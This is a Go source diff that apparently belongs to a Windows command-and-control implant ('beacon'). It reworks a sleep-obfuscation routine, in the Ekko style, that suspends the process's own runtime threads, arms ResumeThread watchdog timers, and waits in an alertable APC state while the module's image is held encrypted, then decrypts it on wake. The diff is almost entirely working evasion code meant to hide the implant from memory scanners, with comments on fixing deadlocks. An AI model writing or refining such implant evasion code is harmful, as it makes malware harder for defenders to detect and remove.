@@ -436,18 +436,40 @@ func healResidualSuspends(currentTID uint32, imageBase, imageEnd uintptr) {
 	}
 }
 
-// suspendImagePeers enumerates every thread in the current process whose
-// user-mode start address falls inside our image (i.e. Go runtime Ms —
-// sysmon, netpoller, GC workers, other beacon goroutines' Ms), skips the
-// calling thread, and calls SuspendThread on the rest. Returns the list
-// of TIDs actually suspended so they can be resumed one-for-one later.
+// peerState is one suspended image-based peer thread plus its per-peer
+// watchdog timer. The handle stays open for the duration of the Sleep
+// cycle (needed by both the watchdog callback and our own resume pass)
+// and is closed at cleanup time.
+type peerState struct {
+	tid     uint32
+	hThread windows.Handle
+	hTimer  uintptr
+}
+
+// suspendAndArmPeers combines what used to be `suspendImagePeers` +
+// the separate watchdog-arming loop into a single pass.
+//
+// CRUCIALLY, the per-peer watchdog timer is armed BEFORE that peer's
+// SuspendThread. This closes the deadlock window we hit in resc_att2:
+// the P-handoff race is triggered by our own SuspendThread on the M
+// that grabbed our released P, and the deadlock manifests in the
+// exitsyscall of the VERY suspend call that trapped it (or a
+// subsequent syscall in the same loop). If we arm the watchdog after
+// the fact, we never get there — no rescue happens. Arming inline
+// means every SuspendThread has its rescue timer already ticking.
+//
+// The timer's callback is procResumeThread.Addr() — a raw Windows API
+// pointer, NOT a Go callback. See ANALYSIS.md for why the Go-callback
+// design would deadlock in the same way as the caller.
 //
 // We DO NOT call GetThreadContext after SuspendThread — that syscall
 // blocks until the kernel commits the suspension and has no timeout,
-// which was the source of one of the Ekko-era hangs. Instead, callers
-// should NtDelayExecution briefly after this returns to let the
-// suspensions commit before touching memory the peers may be reading.
-func suspendImagePeers(currentTID uint32, imageBase, imageEnd uintptr) ([]uint32, error) {
+// which was the source of one of the Ekko-era hangs.
+func suspendAndArmPeers(
+	currentTID uint32,
+	imageBase, imageEnd uintptr,
+	wdTimeoutMs uint64,
+) ([]peerState, error) {
 	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
 	if err != nil {
 		return nil, err
@@ -461,7 +483,7 @@ func suspendImagePeers(currentTID uint32, imageBase, imageEnd uintptr) ([]uint32
 	}
 
 	currentPID := uint32(windows.GetCurrentProcessId())
-	suspended := make([]uint32, 0, 32)
+	peers := make([]peerState, 0, 32)
 
 	for {
 		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
@@ -479,19 +501,50 @@ func suspendImagePeers(currentTID uint32, imageBase, imageEnd uintptr) ([]uint32
 					uintptr(unsafe.Pointer(&retLen)),
 				)
 				if startAddr >= imageBase && startAddr < imageEnd {
+					// Arm the watchdog BEFORE the SuspendThread that
+					// might deadlock us. If Suspend blocks in
+					// exitsyscall, this timer will still fire and
+					// ResumeThread us out of it.
+					var hTimer uintptr
+					wdRet, _, _ := procCreateTimerQueueTimer.Call(
+						uintptr(unsafe.Pointer(&hTimer)),
+						0, // NULL queue = default process-wide queue
+						procResumeThread.Addr(),
+						uintptr(hThread),
+						uintptr(wdTimeoutMs),
+						0, // Period = 0
+						wtExecuteOnlyOnce,
+					)
 					r, _, _ := procSuspendThread.Call(uintptr(hThread))
 					if r != dwordMinusOne {
-						suspended = append(suspended, te.ThreadID)
+						peers = append(peers, peerState{
+							tid:     te.ThreadID,
+							hThread: hThread,
+							hTimer:  hTimer,
+						})
+						// Handle stays open; ownership transferred to
+						// peers slice. Timer may be 0 if arming failed
+						// (rare) — treated as "no rescue for this
+						// peer" but suspend still tracked.
+					} else {
+						// Suspend failed. Cancel any timer we armed
+						// and close the handle we opened.
+						if wdRet != 0 {
+							procDeleteTimerQueueTimer.Call(0, hTimer, ^uintptr(0))
+						}
+						windows.CloseHandle(hThread)
 					}
+				} else {
+					// Not image-based; not our concern.
+					windows.CloseHandle(hThread)
 				}
-				windows.CloseHandle(hThread)
 			}
 		}
 		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
 			break
 		}
 	}
-	return suspended, nil
+	return peers, nil
 }
 
 // resumePeers iterates the TID list produced by suspendImagePeers and
@@ -513,49 +566,57 @@ func suspendImagePeers(currentTID uint32, imageBase, imageEnd uintptr) ([]uint32
 // suspended with no drain messages, which is only possible if
 // ResumeThread was returning -1 on the very first call and the drain
 // loop broke without logging.
-func resumePeers(cycle uint64, tids []uint32) {
-	// Log the TID list so we can correlate leaks against specific peers.
+// resumeAndCleanupPeers resumes each suspended peer (drain-resume to
+// zero), cancels the watchdog timer that was armed for it, and closes
+// its handle. Called at end of Sleep.
+//
+// The watchdog timer for a peer may have already fired (if the sleep
+// deadlocked and was rescued) or may still be pending (normal case).
+// DeleteTimerQueueTimer with INVALID_HANDLE_VALUE handles both:
+// waits for any in-flight callback, and cancels pending ones. Fast in
+// both paths — the callback is one ResumeThread syscall.
+func resumeAndCleanupPeers(cycle uint64, peers []peerState) {
+	tids := make([]uint32, 0, len(peers))
+	for _, p := range peers {
+		tids = append(tids, p.tid)
+	}
 	dbg("cycle=%d resume begin tids=%v", cycle, tids)
 
 	failures := 0
-	for _, tid := range tids {
-		hThread, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, tid)
-		if err != nil {
-			failures++
-			dbg("cycle=%d tid=%d OPEN_FAIL err=%v", cycle, tid, err)
-			continue
+	for _, p := range peers {
+		// Cancel the watchdog first (it may have already fired; that's
+		// fine — its ResumeThread on our target just made our resume
+		// step a no-op for that thread). Blocking cleanup ensures the
+		// timer can't fire between our resume and CloseHandle.
+		if p.hTimer != 0 {
+			procDeleteTimerQueueTimer.Call(0, p.hTimer, ^uintptr(0))
 		}
 
-		// Drain the suspend count. We track the sequence of return values
-		// so if we break early we can report EXACTLY why.
+		// Drain the suspend count. Same logic as before; the handle is
+		// already open on the peerState.
 		var lastR uintptr
 		var lastErr error
 		drainCalls := 0
 		for i := 0; i < maxResumeDrain; i++ {
-			r, _, callErr := procResumeThread.Call(uintptr(hThread))
+			r, _, callErr := procResumeThread.Call(uintptr(p.hThread))
 			drainCalls++
 			lastR = r
 			lastErr = callErr
 			if r == 0 {
-				// Was not suspended when we called Resume.
-				break
+				break // Was not suspended (watchdog may have gotten here first).
 			}
 			if r == 1 {
-				// Was suspended exactly once; now fully resumed.
-				break
+				break // Was suspended once; now zero.
 			}
 			if r == dwordMinusOne {
-				// ResumeThread FAILED. This is the silent path that was
-				// hiding leaks in prior builds.
 				failures++
 				dbg("cycle=%d tid=%d RESUME_FAIL r=-1 err=%v drainCalls=%d",
-					cycle, tid, callErr, drainCalls)
+					cycle, p.tid, callErr, drainCalls)
 				break
 			}
 			// r > 1: still suspended, keep draining.
 		}
 
-		// Log any non-trivial drain (2+ Resume calls) or a cap hit.
 		if drainCalls >= 2 {
 			tag := ""
 			if drainCalls == maxResumeDrain && lastR > 1 && lastR != dwordMinusOne {
@@ -563,10 +624,10 @@ func resumePeers(cycle uint64, tids []uint32) {
 				failures++
 			}
 			dbg("cycle=%d tid=%d DRAIN calls=%d lastR=%d lastErr=%v%s",
-				cycle, tid, drainCalls, lastR, lastErr, tag)
+				cycle, p.tid, drainCalls, lastR, lastErr, tag)
 		}
 
-		windows.CloseHandle(hThread)
+		windows.CloseHandle(p.hThread)
 	}
 
 	if failures > 0 {
@@ -707,56 +768,27 @@ func Sleep(sleepMs uint64) error {
 
 	// Self-heal any residual suspensions from prior cycles before we do
 	// anything else. See healResidualSuspends() docs for the theory of
-	// operation.
+	// operation. This step does NOT itself suspend any peer, so no
+	// P-handoff deadlock can occur here — safe to run before the
+	// watchdog is armed.
 	healResidualSuspends(currentTID, imageBase, imageEnd)
 
-	suspendedTIDs, err := suspendImagePeers(currentTID, imageBase, imageEnd)
+	// Suspend peers AND arm their per-peer watchdog timers in a single
+	// interleaved pass. Each peer's watchdog is created BEFORE that
+	// peer's SuspendThread, so the very first suspend call is already
+	// covered by a rescue timer. Without this ordering, the P-handoff
+	// deadlock during the suspend loop itself would go un-rescued —
+	// exactly what resc_att2 exhibited (log ended at "enter Sleep",
+	// never emitted "suspend done", no WATCHDOG lines because arming
+	// hadn't happened yet).
+	wdTimeoutMs := watchdogTimeoutMs(sleepMs)
+	peers, err := suspendAndArmPeers(currentTID, imageBase, imageEnd, wdTimeoutMs)
 	if err != nil {
 		errorsTotal.Add(1)
-		dbg("cycle=%d suspendImagePeers err=%v", cycle, err)
+		dbg("cycle=%d suspendAndArmPeers err=%v", cycle, err)
 		return err
 	}
-	dbg("cycle=%d suspend done tids=%d currentTID=%d", cycle, len(suspendedTIDs), currentTID)
-
-	// ARM THE WATCHDOG (one direct-API timer per suspended peer).
-	// Everything below this point may deadlock in Go's exitsyscall if a
-	// suspended M is holding the P we release when we entersyscall. The
-	// watchdog is one one-shot CreateTimerQueueTimer per peer, with
-	// procResumeThread.Addr() as the callback — a raw Windows API pointer,
-	// NOT a Go callback. When it fires it invokes
-	// ResumeThread(hThread) directly on a thread-pool worker (which we
-	// never suspend), with zero Go runtime involvement, no LazyProc.Call,
-	// no cgocallback, no P acquisition. That's the crucial difference
-	// from the previous Go-callback design — the previous one deadlocked
-	// in the same way as the caller because its own syscalls needed a P.
-	wdTimeoutMs := watchdogTimeoutMs(sleepMs)
-	wdHandles := make([]windows.Handle, 0, len(suspendedTIDs))
-	wdTimers := make([]uintptr, 0, len(suspendedTIDs))
-	for _, tid := range suspendedTIDs {
-		hT, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, tid)
-		if err != nil {
-			continue
-		}
-		var hTimer uintptr
-		wdRet, _, _ := procCreateTimerQueueTimer.Call(
-			uintptr(unsafe.Pointer(&hTimer)),
-			0, // NULL queue = default process-wide queue
-			procResumeThread.Addr(),
-			uintptr(hT),
-			uintptr(wdTimeoutMs),
-			0, // Period = 0 (one-shot)
-			wtExecuteOnlyOnce,
-		)
-		if wdRet == 0 {
-			windows.CloseHandle(hT)
-			continue
-		}
-		wdHandles = append(wdHandles, hT)
-		wdTimers = append(wdTimers, hTimer)
-	}
-	if len(wdTimers) != len(suspendedTIDs) {
-		dbg("cycle=%d watchdog partial arm: %d/%d timers", cycle, len(wdTimers), len(suspendedTIDs))
-	}
+	dbg("cycle=%d suspend done peers=%d currentTID=%d", cycle, len(peers), currentTID)
 
 	// SuspendThread is asynchronous — give the kernel a moment to commit
 	// each suspension before we start mutating the image. Without this,
@@ -779,7 +811,7 @@ func Sleep(sleepMs uint64) error {
 		// and bail. Failing to resume peers here would leave the process
 		// deadlocked with no way out.
 		dbg("cycle=%d QueueUserAPC returned 0", cycle)
-		resumePeers(cycle, suspendedTIDs)
+		resumeAndCleanupPeers(cycle, peers)
 		errorsTotal.Add(1)
 		return errors.New("apc: QueueUserAPC failed")
 	}
@@ -803,25 +835,15 @@ func Sleep(sleepMs uint64) error {
 
 	dbg("cycle=%d alertable wait returned", cycle)
 
-	// -------- RESUME PEER GO Ms --------
+	// -------- RESUME PEERS + CANCEL WATCHDOGS --------
 	// Image is decrypted and executable again; peers are safe to run.
-	resumePeers(cycle, suspendedTIDs)
-
-	// DISARM THE WATCHDOG.
-	// Cancel every per-peer timer. INVALID_HANDLE_VALUE as CompletionEvent
-	// tells DeleteTimerQueueTimer to block until any in-flight callback
-	// finishes — necessary so a firing timer isn't still running when we
-	// close its target handle. The callback is a single ResumeThread
-	// syscall, so this wait is trivially bounded.
-	//
-	// Threads that were already resumed by our own resumePeers pass will
-	// see ResumeThread return 0 (was not suspended) — a harmless no-op.
-	for _, hTimer := range wdTimers {
-		procDeleteTimerQueueTimer.Call(0, hTimer, ^uintptr(0))
-	}
-	for _, hT := range wdHandles {
-		windows.CloseHandle(hT)
-	}
+	// resumeAndCleanupPeers takes the peerState list and:
+	//   - Cancels each watchdog timer (blocking until any in-flight
+	//     callback finishes, so the timer can't fire between our
+	//     drain-resume and CloseHandle).
+	//   - Drain-resumes each peer using the already-open handle.
+	//   - Closes the handle.
+	resumeAndCleanupPeers(cycle, peers)
 
 	// If our actual sleep duration significantly exceeded the intended
 	// duration, some watchdog timer must have fired to rescue us. This
